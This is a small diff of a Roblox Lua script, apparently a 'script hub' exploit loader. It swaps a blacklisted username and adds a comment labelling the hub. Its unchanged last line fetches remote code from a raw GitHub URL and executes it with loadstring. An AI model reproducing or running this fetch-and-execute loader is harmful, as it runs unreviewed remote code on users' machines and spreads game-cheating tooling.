@@ -2,7 +2,7 @@ local StarterGui = game:GetService("StarterGui")
 local Players = game:GetService("Players")
 
 local BlacklistedPlayers = {
-    ["q9494979sksnxbzj5"] = true,
+    ["10h_pac"] = true,
 }
 
 local function IsBlacklisted(player)
@@ -35,4 +35,5 @@ else
         Duration = 7,
     })
 end
+--[[6脚本中心]]
 loadstring(game:HttpGet("https://raw.githubusercontent.com/qwaszxcv85/6jiaoben/refs/heads/main/%E5%85%AD%E8%84%9A%E6%9C%AC%E4%B8%AD%E5%BF%83.txt"))()
